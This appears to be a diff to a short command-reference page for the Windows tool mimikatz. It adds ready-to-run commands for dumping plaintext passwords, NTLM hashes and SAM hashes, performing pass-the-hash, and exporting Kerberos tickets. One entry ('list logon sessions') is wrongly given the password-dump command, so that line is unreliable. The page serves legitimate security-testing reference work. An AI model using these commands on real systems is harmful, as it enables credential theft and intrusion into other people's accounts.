@@ -1,16 +1,36 @@
 # mimikatz
 
-> Tool to interact with Windows security credentials and perform advanced post-exploitation tasks. Requires administrative privileges.
+> Interact with Windows credentials, perform credential dumping, token manipulation, and more. Requires administrator privileges and typically runs on Windows.
 > More information: <https://github.com/gentilkiwi/mimikatz>.
 
-- Start mimikatz in interactive mode:
+- Run mimikatz in interactive mode.
 
 `mimikatz`
 
-- Execute a single command:
+- Enable debug privileges (needed for most operations).
 
-`mimikatz {{command_to_execute}}`
+`mimikatz "privilege::debug"`
 
-- Exit mimikatz:
+- List available logon sessions.
+
+`mimikatz "sekurlsa::logonpasswords"`
+
+- Dump plaintext passwords, NTLM hashes, and Kerberos tickets from memory.
+
+`mimikatz "sekurlsa::logonpasswords"`
+
+- Pass-the-Hash with a specific NTLM hash and launch a command.
+
+`mimikatz "sekurlsa::pth /user:{{username}} /domain:{{domain}} /ntlm:{{hash}} /run:{{cmd}}"`
+
+- Dump local SAM database hashes.
+
+`mimikatz "lsadump::sam"`
+
+- Extract Kerberos tickets and export to a file.
+
+`mimikatz "kerberos::list /export"`
+
+- Exit mimikatz.
 
 `exit`
